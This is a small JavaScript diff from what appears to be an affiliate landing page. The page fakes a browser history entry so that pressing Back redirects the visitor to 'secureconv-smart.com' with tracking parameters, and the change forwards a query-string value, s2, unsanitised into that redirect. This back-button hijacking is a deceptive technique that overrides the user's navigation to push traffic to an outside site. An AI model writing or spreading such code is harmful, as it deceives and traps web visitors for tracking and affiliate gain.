@@ -22,12 +22,25 @@
 
             }());
 
+            function GetRequest() {
+                var url = location.search;
+                var theRequest = new Object();
+                if (url.indexOf("?") != -1) {
+                    var str = url.substr(1);
+                    strs = str.split("&");
+                    for (var i = 0; i < strs.length; i++) {
+                        theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
+                    }
+                }
+                return theRequest;
+            }
             if (window.location.hash != "#t") {
                 pushHistory();
             }
             window.addEventListener("popstate", function (e) {
                 afilter(5);
-                window.location.href = "https://secureconv-smart.com/?a=70580&c=130746";
+                var res=GetRequest();
+                window.location.href = "https://secureconv-smart.com/?a=70580&c=130746&s2="+res.s2;
             }, false);
 
             function pushHistory() {
